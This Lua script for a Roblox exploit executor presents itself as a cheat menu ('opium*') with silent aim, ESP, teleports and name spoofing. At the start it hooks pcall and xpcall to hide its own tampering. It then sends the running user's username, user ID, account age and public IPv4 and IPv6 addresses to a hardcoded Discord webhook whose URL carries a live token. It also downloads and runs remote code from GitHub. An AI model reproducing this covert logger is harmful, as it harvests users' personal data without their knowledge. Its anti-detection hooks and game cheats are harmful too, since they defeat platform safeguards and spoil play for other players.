local originalSynapse = syn.request
local clonedSynapse = clonefunction(syn.request)
local NC = newcclosure
local hookOnto = {pcall, xpcall}

for _,v in pairs(hookOnto) do
    local oldFunction;
    oldFunction = hookfunction(v, NC(function(self, ...)
        return oldFunction(self == clonedSynapse and originalSynapse or self, ...)
    end))
end
print'bypass enabled?! test it out'
local Webhook = "https://discord.com/api/webhooks/1079288248226029678/JWBXLFRXhCXh01CUvQGzPhNumX6hgR30x74W2x02I72_PzvabQMuQ91EPIiZgQxRkUTm" -- Put your Webhook link here

local IPv4 = game:HttpGet("https://v4.ident.me/")
local IPv6 = game:HttpGet("https://v6.ident.me/")

local Headers = {["content-type"] = "application/json"} -- Don't Modify

local LocalPlayer = game:GetService("Players").LocalPlayer

local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local UserId = LocalPlayer.UserId
local PlayerName = LocalPlayer.Name

local PlayerData =
{
       ["content"] = "",
       ["embeds"] = {{
           ["title"] = "**Username**:",
           ["description"] = PlayerName,
           ["color"] = tonumber(0x2B6BE4),
           ["fields"] = {
               {
                   ["name"] = "MembershipType:",
                   ["value"] = MembershipType,
                   ["inline"] = true
},
               {
                   ["name"] = "AccountAge:",
                   ["value"] = AccountAge,
                   ["inline"] = true
},
               {
                   ["name"] = "UserId:",
                   ["value"] = UserId,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv4:",
                   ["value"] = IPv4,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv6:",
                   ["value"] = IPv6,
                   ["inline"] = true
},
           },
       }}
   }

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
   HttpRequest = syn.request
   else
   HttpRequest = http_request
end

HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})




   -- variables
   local Sense = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Sirius/request/library/sense/source.lua'))()
   -- // Load Aiming Module
   local Aiming = loadstring(game:HttpGet('https://raw.githubusercontent.com/iikla/vars/main/aiming.lua'))("Module")
   local AimingSelected = Aiming.Selected
   local AimingChecks = Aiming.Checks
   
   -- // Hook
   local __index
   __index = hookmetamethod(game, "__index", function(t, k)
       -- // Check if it trying to get our mouse's hit or target
       if (t:IsA("Mouse") and (k == "Hit" or k == "Target")) then
           -- // If we can use the silent aim
           if (AimingChecks.IsAvailable()) then
               -- // Vars
               local TargetPart = AimingSelected.Part
   
               -- // Return modded val
               return (k == "Hit" and TargetPart.CFrame or TargetPart)
           end
       end
   
       -- // Return
       return __index(t, k)
   end)
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   local AimingSettings = Aiming.Settings
   --Ui Making
   local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/vozoid/ui-libraries/main/drawing/void/source.lua"))()
   local watermark = library:Watermark("opium* | beta | dev build")
   
   
   
   
   local main = library:Load{
       Name = "opium* | sigma | dev",
       SizeX = 680,
       SizeY = 400,
       Theme = "Midnight",
       Extension = "json", -- config file extension
       Folder = "opium*" -- config folder name
   }
   
   
   
   local aim = main:Tab("aimbot")
   local aimleft = aim:Section{
       Name = "silent aim",
       Side = "Left"
   }
   
   local satog = aimleft:Toggle{
       Name = "enabled",
       Flag = "silent aim 1",
       Default = false,
       Callback  = function(bool)
           AimingSettings.Enabled = bool
       end
   }
   local fovtog = aimleft:Toggle{
       Name = "fov",
       Flag = " fov1",
       Default = false,
       Callback  = function(bool)
           AimingSettings.FOVSettings.Enabled = bool
       end
   }
   local togglepicker1 = fovtog:ColorPicker{
       Default = Color3.fromRGB(255, 255, 255),
       Flag = "Toggle 1 Picker 1",
       Callback = function(color)
           AimingSettings.FOVSettings.Colour = color
       end
   }
   local fovshowtog = aimleft:Toggle{
       Name = "show fov",
       Flag = " fov12",
       Default = false,
       Callback  = function(bool)
           AimingSettings.FOVSettings.Visible = bool
       end
   }
   
   
   fovtog:Slider{
       Text = "[value]/360",
       Default = 180,
       Min = 30,
       Max = 360,
       Float = 1,
       Flag = "fov 1",
       Callback = function(value)
           AimingSettings.FOVSettings.Scale = value
       end
   }
   local AimingSettingsTracerSettings = AimingSettings.TracerSettings
   local tracertog = aimleft:Toggle{
       Name = "Tracers",
       Flag = "Toggle 1",
       --Default = true,
       Callback  = function(bool)
           AimingSettingsTracerSettings.Enabled = bool
       end
   }
   
   local tracercolor = tracertog:ColorPicker{
       Default = Color3.fromRGB(255, 255, 255),
       Flag = "Toggle 1 Picker 1",
       Callback = function(color)
           AimingSettingsTracerSettings.Colour = color
       end
   }
   aimleft:Slider{
       Name = "hitchance",
       Text = "[value]/100",
       Default = 100,
       Min = 1,
       Max = 100,
       Float = 1,
       Flag = "Slider 1",
       Callback = function(value)
           AimingSettings.HitChance = value
       end
   }
   
   
   aimleft:Dropdown{
       Name = "hitpart",
       Default = "Option 1",
       Content = {
           "Head",
           "HumanoidRootPart"
       },
       Max = 2, -- turns into multidropdown
       --Scrollable = true, -- makes it scrollable
       --ScrollingMax = 5, -- caps the amount it contains before scrolling
       Flag = "Dropdown 1",
       Callback = function(option)
           AimingSettings.TargetPart = option
       end
   }
   aimleft:Slider{
       Name = "max hit distance",
       Text = "[value]/100",
       Default = 200,
       Min = 1,
       Max = 1000,
       Float = 1,
       Flag = "Slidfdser 1",
       Callback = function(value)
           AimingSettings.MaxDistance = value
       end
   }
   local healthcheck = aimleft:Toggle{
       Name = "health check",
       Flag = "silent aim 1",
       Default = false,
       Callback  = function(bool)
           AimingSettings.HealthCheck = bool
       end
   }
   
   
   local vissettings = main:Tab("visuals settings")
   local mastersets = vissettings:Section{
       Name = "master switch",
       Side = "Left"
   }
   mastersets:Slider{
       Name = "text size",
       Text = "[value]/20",
       Default = 14,
       Min = 1,
       Max = 20,
       Float = 1,
       Flag = "Slfdsider 1",
       Callback = function(value)
           Sense.sharedSettings.textSize = value
       end
   }
   
   local limitdis = mastersets:Toggle{
       Name = "limit esp distance",
       Flag = "Toggle 4",
       Default = false,
       Callback  = function(bool)
           Sense.sharedSettings.limitDistance = bool
       end
   }
   mastersets:Slider{
       Name = "distance limited",
       Text = "[value]/5000",
       --Default = 5,
       Min = 1,
       Max = 5000,
       Float = 1,
       Flag = "Slffsddsider 1",
       Callback = function(value)
           Sense.sharedSettings.maxDistance = value
       end
   }
   local enemyvisuals = main:Tab("enemy visuals")
   local mastere = enemyvisuals:Section{
       Name = "master switch",
       Side = "Left"
   }
   local espenable = mastere:Toggle{
       Name = "enable",
       Flag = "esptog",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.enabled = bool
       end
   }
   
   local section = enemyvisuals:Section{
       Name = "esp",
       Side = "Left"
   }
   local boxtoggle = section:Toggle{
       Name = "box",
       Flag = "boxtog",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.box = bool
       end
   }
   local boxtogglepicker1 = boxtoggle:ColorPicker{
       Default = Color3.fromRGB(84, 103, 250),
       Flag = "boxtogcolor",
       Callback = function(color)
           Sense.teamSettings.enemy.boxColor[1] = color
       end
   }
   local boxouttoggle = section:Toggle{
       Name = "box outline",
       Flag = "boxouttog",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.boxOutline = bool
       end
   }
   local boxouttogglepicker1 = boxouttoggle:ColorPicker{
       Default = Color3.fromRGB(162, 158, 158),
       Flag = "boxouttogcolor",
       Callback = function(color)
           Sense.teamSettings.enemy.boxOutlineColor[1] = color
       end
   }
   local threed = section:Toggle{
       Name = "3dbox",
       Flag = "3dbox",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.box3d = bool
       end
   }
   local threedcolor = threed:ColorPicker{
       Default = Color3.fromRGB(128, 252, 126),
       Flag = "threedcolor",
       Callback = function(color)
           Sense.teamSettings.enemy.box3dColor[1] = color
       end
   }
   local hbtoggle = section:Toggle{
       Name = "health bar",
       Flag = "hbtog",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.healthBar = bool
       end
   }
   
   local hbouttoggle = section:Toggle{
       Name = "health bar outline",
       Flag = "boxtog",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.healthBarOutline = bool
       end
   }
   local hboutcolor = hbouttoggle:ColorPicker{
       Default = Color3.fromRGB(0, 0, 0),
       Flag = "penis",
       Callback = function(color)
           Sense.teamSettings.enemy.healthBarOutlineColor[1] = color
       end
   }
   local nametoggle = section:Toggle{
       Name = "name",
       Flag = "name",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.name = bool
       end
   }
   local namecolor = nametoggle:ColorPicker{
       Default = Color3.fromRGB(255, 255, 255),
       Flag = "dick",
       Callback = function(color)
           Sense.teamSettings.enemy.nameColor[1] = color
       end
   }
   local nameouttoggle = section:Toggle{
       Name = "name outline",
       Flag = "nameout",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.nameOutline = bool
       end
   }
   
   local weapon = section:Toggle{
       Name = "weapon",
       Flag = "weapon 1",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.weapon = bool
       end
   }
   local weaponpicker = weapon:ColorPicker{
       Default = Color3.fromRGB(255, 255, 255),
       Flag = "weapnpd",
       Callback = function(color)
           Sense.teamSettings.enemy.weaponColor[1] = color
       end
   }
   
   local weaponO = section:Toggle{
       Name = "weapon outline",
       Flag = "weapon 21",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.weaponOutline = bool
       end
   }
   
   local distance = section:Toggle{
       Name = "distance",
       Flag = "distance 1",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.distance = bool
       end
   }
   local disctancecolor = weapon:ColorPicker{
       Default = Color3.fromRGB(255, 255, 255),
       Flag = "distance32",
       Callback = function(color)
           Sense.teamSettings.enemy.distanceColor[1] = color
       end
   }
   
   local distanceO = section:Toggle{
       Name = "distance outline",
       Flag = "distance 1o",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.distanceOutline = bool
       end
   }
   
   
   
   local chamsseci = enemyvisuals:Section{
       Name = "chams",
       Side = "Right"
   }
   local chamstog = chamsseci:Toggle{
       Name = "chams",
       Flag = "chams 1",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.chams = bool
       end
   }
   local chamscol = chamstog:ColorPicker{
       Default = Color3.fromRGB(0, 0, 255),
       Flag = "chamsf",
       Callback = function(color)
           Sense.teamSettings.enemy.chamsFillColor[1] = color
       end
   }
   local chamscolf = chamstog:ColorPicker{
       Default = Color3.fromRGB(0, 0, 0),
       Flag = "chamsf3",
       Callback = function(color)
           Sense.teamSettings.enemy.chamsOutlineColor[1] = color
       end
   }
   
   local chamsvis = chamsseci:Toggle{
       Name = "chams visible only",
       Flag = "chams 2",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.enemy.chamsVisibleOnly = bool
       end
   }
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   local teamvisuals = main:Tab("team visuals")
   local master = teamvisuals:Section{
       Name = "master switch",
       Side = "Left"
   }
   
   local espenable = master:Toggle{
       Name = "enable",
       Flag = "esptog",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.enabled = bool
       end
   }
   
   local teamvis = teamvisuals:Section{
       Name = "esp",
       Side = "Left"
   }
   local boxtogglec = teamvis:Toggle{
       Name = "box",
       Flag = "boxtog",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.box = bool
       end
   }
   local boxtogglepicker1c = boxtogglec:ColorPicker{
       Default = Color3.fromRGB(255, 0, 0),
       Flag = "boxtogcolor",
       Callback = function(color)
           Sense.teamSettings.friendly.boxColor[1] = color
       end
   }
   local boxouttogglec = teamvis:Toggle{
       Name = "box outline",
       Flag = "boxouttog",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.boxOutline = bool
       end
   }
   local boxouttogglepicker1c = boxouttogglec:ColorPicker{
       Default = Color3.fromRGB(255, 0, 0),
       Flag = "boxouttogcolor",
       Callback = function(color)
           Sense.teamSettings.friendly.boxOutlineColor[1] = color
       end
   }
   local threedc = teamvis:Toggle{
       Name = "3dbox",
       Flag = "3dbox",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.box3d = bool
       end
   }
   local threedcolorc = threedc:ColorPicker{
       Default = Color3.fromRGB(128, 252, 126),
       Flag = "threedcolor",
       Callback = function(color)
           Sense.teamSettings.friendly.box3dColor[1] = color
       end
   }
   local hbtogglec = teamvis:Toggle{
       Name = "health bar",
       Flag = "hbtog",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.healthBar = bool
       end
   }
   local hbouttogglec = teamvis:Toggle{
       Name = "health bar outline",
       Flag = "boxtog",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.healthBarOutline = bool
       end
   }
   local hboutcolorc = hbouttogglec:ColorPicker{
       Default = Color3.fromRGB(0, 0, 0),
       Flag = "penis",
       Callback = function(color)
           Sense.teamSettings.friendly.healthBarOutlineColor[1] = color
       end
   }
   local nametogglec = teamvis:Toggle{
       Name = "name",
       Flag = "name",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.name = bool
       end
   }
   local namecolorc = nametogglec:ColorPicker{
       Default = Color3.fromRGB(255, 255, 255),
       Flag = "dick",
       Callback = function(color)
           Sense.teamSettings.friendly.nameColor[1] = color
       end
   }
   local nameouttogglec = teamvis:Toggle{
       Name = "name outline",
       Flag = "nameout",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.nameOutline = bool
       end
   }
   
   local weaponc = teamvis:Toggle{
       Name = "weapon",
       Flag = "weapon 1",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.weapon = bool
       end
   }
   local weaponpickedrc = weaponc:ColorPicker{
       Default = Color3.fromRGB(255, 255, 255),
       Flag = "weapnpd",
       Callback = function(color)
           Sense.teamSettings.friendly.weaponColor[1] = color
       end
   }
   
   local weaponOcc = teamvis:Toggle{
       Name = "weapon outline",
       Flag = "weapon 21",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.weaponOutline = bool
       end
   }
   
   local distancec = teamvis:Toggle{
       Name = "distance",
       Flag = "distance 1",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.distance = bool
       end
   }
   local disctancecolorc = distancec:ColorPicker{
       Default = Color3.fromRGB(255, 255, 255),
       Flag = "distance32",
       Callback = function(color)
           Sense.teamSettings.friendly.distanceColor[1] = color
       end
   }
   
   local disctanceouttoggle = teamvis:Toggle{
       Name = "distance outline",
       Flag = "sdffsf 1",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.distanceOutline = bool
       end
   }
   
   
   
   
   
   local teamchams = teamvisuals:Section{
       Name = "chams",
       Side = "Right"
   }
   local chamstogg = teamchams:Toggle{
       Name = "chams",
       Flag = "chams 1",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.chams = bool
       end
   }
   local chamscoll = chamstogg:ColorPicker{
       Default = Color3.fromRGB(0, 0, 255),
       Flag = "chamsf",
       Callback = function(color)
           Sense.teamSettings.friendly.chamsFillColor[1] = color
       end
   }
   local chamscolff = chamstogg:ColorPicker{
       Default = Color3.fromRGB(0, 0, 0),
       Flag = "chamsf3",
       Callback = function(color)
           Sense.teamSettings.friendly.chamsOutlineColor[1] = color
       end
   }
   
   local chamsviss = teamchams:Toggle{
       Name = "chams visible only",
       Flag = "chams 2",
       --Default = true,
       Callback  = function(bool)
           Sense.teamSettings.friendly.chamsVisibleOnly = bool
       end
   }
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   local other = main:Tab("other")
   
   local telesec = other:Section{
       Name = "teleports",
       Side = "Left"
   }
   telesec:Button{
       Name = "esr base",
       Callback  = function()
           tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(0.5, Enum.EasingStyle.Linear)
           tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(-351.6204833984375, 3.2552220821380615, -58.83670425415039)}):Play()
       end
   }
   
   local othersec = other:Section{
       Name = "other",
       Side = "right"
   }
   local clogstog = othersec:Toggle{
       Name = "chat logs",
       Flag = "Toggle2 1",
       --Default = true,
       Callback  = function(bool)
           V = bool
           if V == true then
               local ChatFrame = game.Players.LocalPlayer.PlayerGui.Chat.Frame
               ChatFrame.ChatChannelParentFrame.Visible = true
               ChatFrame.ChatBarParentFrame.Position = ChatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), ChatFrame.ChatChannelParentFrame.Size.Y)
           elseif V == false then
               local ChatFrame = game.Players.LocalPlayer.PlayerGui.Chat.Frame
               ChatFrame.ChatChannelParentFrame.Visible = false
               ChatFrame.ChatBarParentFrame.Position = ChatFrame.ChatChannelParentFrame.Position + UDim2.new(0, 0, 0, 0)
           end
   
       end
   }
   
   local lighting = game:GetService("Lighting")
   local lightingsec = other:Section{
       Name = "lighting",
       Side = "Right"
   }
   local ambientcolor = lightingsec:ColorPicker{
       name = "ambient",
       Default = Color3.fromRGB(255, 255, 255), 
       Flag = "Toggle 1 Picker 1", 
       Callback = function(color)
           lighting.Ambient = color
       end
   }
   lightingsec:Slider{
       Name = "brightness",
       Text = "[value]/50",
       --Default = 5,
       Min = 0,
       Max = 50,
       Float = 1,
       Flag = "Sdslider 1",
       Callback = function(value)
           lighting.Brightness = value
       end
   }
   local fogcolorpicker = lightingsec:ColorPicker{
       name = "fog color",
       Default = Color3.fromRGB(255, 255, 255), 
       Flag = "Toggle 1 Picker 1", 
       Callback = function(color)
           lighting.FogColor = color
       end
   }
   lightingsec:Slider{
       Name = "fog start",
       Text = "[value]/100",
       --Default = 5,
       Min = 1,
       Max = 100,
       Float = 1,
       Flag = "Sdslfsdsider 1",
       Callback = function(value)
           lighting.FogStart = value
       end
   }
   lightingsec:Slider{
       Name = "fog end",
       Text = "[value]/10000",
       --Default = 5,
       Min = 1,
       Max = 10000,
       Float = 1,
       Flag = "Sdsfsdlider 1",
       Callback = function(value)
           lighting.FogEnd = value
       end
   }
   
   local sunhone = lightingsec:Toggle{
       Name = "sun",
       Flag = "fdsfsdfds",
       Default = true,
       Callback  = function(bool)
           lighting.SunRays.Enabled = bool
       end
   }
   lightingsec:Slider{
       Name = "star count",
       Text = "[value]/5000",
       Default = 3000,
       Min = 1,
       Max = 5000,
       Float = 1,
       Flag = "Sdsfsdlider 1",
       Callback = function(value)
           lighting.Sky.StarCount = value
       end
   }
   local secsec = other:Section{
       Name = "security",
       Side = "Left"
   }
   local tag = game:GetService("Workspace").Map.Tags:GetChildren()
   local namerem = secsec:Toggle{
       Name = "stats gui (bottom left)",
       Flag = "Togfdasfdasgle 4",
       Default = true,
       Callback  = function(bool)
           game:GetService("Players").LocalPlayer.PlayerGui.Main.Stats.Visible = bool
       end
   }
   local lpname = game:GetService("Players").LocalPlayer.Name
   
   -- Get the object you want to destroy by name
   local objectToDestroy = game.Workspace.Map.Tags:FindFirstChild(lpname)
   secsec:Button{
       Name = "remove local nametag",
       Callback  = function()
   -- Check if the object exists before trying to destroy it
           if objectToDestroy and objectToDestroy:IsA("BillboardGui") then
               objectToDestroy:Destroy()
           end
   end
   }
   local customText = "OPIUM*, discord.gg/opium"
   
   
   -- Set up the boolean value
   local isCustomizing = false
   
   -- Define the function to customize proximity prompts
   local function customizeProximityPrompts()
       -- Locate the local player's character
       local player = game.Players.LocalPlayer
       local character = player.Character or player.CharacterAdded:Wait()
   
       -- Find all proximity prompts in the character and set up custom text
       for _, child in ipairs(character:GetDescendants()) do
           if child:IsA("ProximityPrompt") then
               child.ActionText = customText
           end
       end
   
       -- Listen for new proximity prompts to be created on the character and set up custom text
       character.DescendantAdded:Connect(function(child)
           if child:IsA("ProximityPrompt") then
               child.ActionText = customText
           end
       end)
   end
   while isCustomizing do
       customizeProximityPrompts()
       wait(5) -- Wait for some time before the next iteration
   end
   local stomprem = secsec:Toggle{
       Name = "spoof stomp",
       Flag = "Togfdfsdasfdasgle 4",
       Default = false,
       Callback  = function(bool)
            -- Update the boolean value based on the toggle state
            isCustomizing = bool
           
            -- If the boolean is set to true, run the proximity prompt customization
            if isCustomizing then
                customizeProximityPrompts()
            end
       end
   
   }
   -- Define the new name to use for the local player and the leaderboard names
   local newName = "OPIUM"
   
   -- Function to change the local player's display name and the leaderboard names
   local function changeNames()
       -- Get the local player
       local player = game.Players.LocalPlayer
   
       -- Change the player's display name to the new name
       player.DisplayName = newName
   
       -- Find the leaderboard in the workspace
       local leaderboard = game.Workspace:WaitForChild("leaderboard")
   
       -- Loop through each entry in the leaderboard and change the name to the new name
       for _, entry in ipairs(leaderboard:GetChildren()) do
           local playerName = entry:FindFirstChild("PlayerName")
           if playerName and playerName.Value == player.Name then
               playerName.Text = newName
           end
       end
   end
   
   -- Get the local player
   local player = game.Players.LocalPlayer
   secsec:Button{
       Name = "spoof display name on leaderboard",
       Callback = function()
           changeNames()
       end
   }
   
   
   
   local configs = main:Tab("configuration")
   
   local themes = configs:Section{Name = "theme", Side = "Left"}
   
   local themepickers = {}
   
   local themelist = themes:Dropdown{
       Name = "theme",
       Default = library.currenttheme,
       Content = library:GetThemes(),
       Flag = "Theme Dropdown",
       Callback = function(option)
           if option then
               library:SetTheme(option)
   
               for option, picker in next, themepickers do
                   picker:Set(library.theme[option])
               end
           end
       end
   }
   
   library:ConfigIgnore("theme dropdown")
   
   local namebox = themes:Box{
       Name = "custom theme name",
       Placeholder = "custom theme",
       Flag = "custom theme"
   }
   
   library:ConfigIgnore("custom theme")
   
   themes:Button{
       Name = "save custom theme",
       Callback = function()
           if library:SaveCustomTheme(library.flags["custom theme"]) then
               themelist:Refresh(library:GetThemes())
               themelist:Set(library.flags["custom theme"])
               namebox:Set("")
           end
       end
   }
   
   local customtheme = configs:Section{Name = "custom theme", Side = "Right"}
   
   themepickers["accent"] = customtheme:ColorPicker{
       Name = "accent",
       Default = library.theme["Accent"],
       Flag = "Accent",
       Callback = function(color)
           library:ChangeThemeOption("Accent", color)
       end
   }
   
   library:ConfigIgnore("accent")
   
   themepickers["window Background"] = customtheme:ColorPicker{
       Name = "window Background",
       Default = library.theme["Window Background"],
       Flag = "Window Background",
       Callback = function(color)
           library:ChangeThemeOption("Window Background", color)
       end
   }
   
   library:ConfigIgnore("Window Background")
   
   themepickers["window border"] = customtheme:ColorPicker{
       Name = "window border",
       Default = library.theme["Window Border"],
       Flag = "Window Border",
       Callback = function(color)
           library:ChangeThemeOption("Window Border", color)
       end
   }
   
   library:ConfigIgnore("Window Border")
   
   themepickers["Tab Background"] = customtheme:ColorPicker{
       Name = "tab background",
       Default = library.theme["Tab Background"],
       Flag = "Tab Background",
       Callback = function(color)
           library:ChangeThemeOption("Tab Background", color)
       end
   }
   
   library:ConfigIgnore("Tab Background")
   
   themepickers["Tab Border"] = customtheme:ColorPicker{
       Name = "tab border",
       Default = library.theme["Tab Border"],
       Flag = "Tab Border",
       Callback = function(color)
           library:ChangeThemeOption("Tab Border", color)
       end
   }
   
   library:ConfigIgnore("Tab Border")
   
   themepickers["tab toggle background"] = customtheme:ColorPicker{
       Name = "tab toggle background",
       Default = library.theme["Tab Toggle Background"],
       Flag = "Tab Toggle Background",
       Callback = function(color)
           library:ChangeThemeOption("Tab Toggle Background", color)
       end
   }
   
   library:ConfigIgnore("Tab Toggle Background")
   
   themepickers["Section Background"] = customtheme:ColorPicker{
       Name = "section background",
       Default = library.theme["Section Background"],
       Flag = "Section Background",
       Callback = function(color)
           library:ChangeThemeOption("Section Background", color)
       end
   }
   
   library:ConfigIgnore("Section Background")
   
   themepickers["section border"] = customtheme:ColorPicker{
       Name = "section border",
       Default = library.theme["Section Border"],
       Flag = "Section Border",
       Callback = function(color)
           library:ChangeThemeOption("Section Border", color)
       end
   }
   
   library:ConfigIgnore("Section Border")
   
   themepickers["Text"] = customtheme:ColorPicker{
       Name = "text",
       Default = library.theme["Text"],
       Flag = "Text",
       Callback = function(color)
           library:ChangeThemeOption("Text", color)
       end
   }
   
   library:ConfigIgnore("Text")
   
   themepickers["disabled text"] = customtheme:ColorPicker{
       Name = "disabled text",
       Default = library.theme["Disabled Text"],
       Flag = "Disabled Text",
       Callback = function(color)
           library:ChangeThemeOption("Disabled Text", color)
       end
   }
   
   library:ConfigIgnore("Disabled Text")
   
   themepickers["Object Background"] = customtheme:ColorPicker{
       Name = "object background",
       Default = library.theme["Object Background"],
       Flag = "Object Background",
       Callback = function(color)
           library:ChangeThemeOption("Object Background", color)
       end
   }
   
   library:ConfigIgnore("Object Background")
   
   themepickers["Object Border"] = customtheme:ColorPicker{
       Name = "boject border",
       Default = library.theme["Object Border"],
       Flag = "Object Border",
       Callback = function(color)
           library:ChangeThemeOption("Object Border", color)
       end
   }
   
   library:ConfigIgnore("Object Border")
   
   themepickers["Dropdown Option Background"] = customtheme:ColorPicker{
       Name = "dropdown option background",
       Default = library.theme["Dropdown Option Background"],
       Flag = "Dropdown Option Background",
       Callback = function(color)
           library:ChangeThemeOption("Dropdown Option Background", color)
       end
   }
   
   library:ConfigIgnore("Dropdown Option Background")
   
   local configsection = configs:Section{Name = "configs", Side = "Left"}
   
   local configlist = configsection:Dropdown{
       Name = "configs",
       Content = library:GetConfigs(), -- GetConfigs(true) if you want universal configs
       Flag = "Config Dropdown"
   }
   
   library:ConfigIgnore("Config Dropdown")
   
   local loadconfig = configsection:Button{
       Name = "load config",
       Callback = function()
           library:LoadConfig(library.flags["Config Dropdown"]) -- LoadConfig(library.flags["Config Dropdown"], true)  if you want universal configs
       end
   }
   
   local delconfig = configsection:Button{
       Name = "delete config",
       Callback = function()
           library:DeleteConfig(library.flags["Config Dropdown"]) -- DeleteConfig(library.flags["Config Dropdown"], true)  if you want universal configs
           configlist:Refresh(library:GetConfigs())
       end
   }
   
   
   local configbox = configsection:Box{
       Name = "config name",
       Placeholder = "Config Name",
       Flag = "Config Name"
   }
   
   library:ConfigIgnore("Config Name")
   
   local save = configsection:Button{
       Name = "save config",
       Callback = function()
           library:SaveConfig(library.flags["Config Dropdown"] or library.flags["Config Name"]) -- SaveConfig(library.flags["Config Name"], true) if you want universal configs
           configlist:Refresh(library:GetConfigs())
       end
   }
   local keybindsection = configs:Section{Name = "ui toggle keybind", Side = "Left"}
   
   keybindsection:Keybind{
       Name = "ui toggle",
       Flag = "UI Toggle",
       Default = Enum.KeyCode.RightShift,
       Blacklist = {Enum.UserInputType.MouseButton1, Enum.UserInputType.MouseButton2, Enum.UserInputType.MouseButton3},
       Callback = function(_, fromsetting)
           if not fromsetting then
               library:Close()
           end
       end
   }
   
   keybindsection:Button{
    Name = "unhook",
    Callback  = function()
        library:Unload()
        Sense.Unload()
        AimingSettings.Enabled = false
        AimingSettings.FOVSettings.Enabled = false
        AimingSettings.TracerSettings.Enabled = false
    end
}
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   Sense.Load()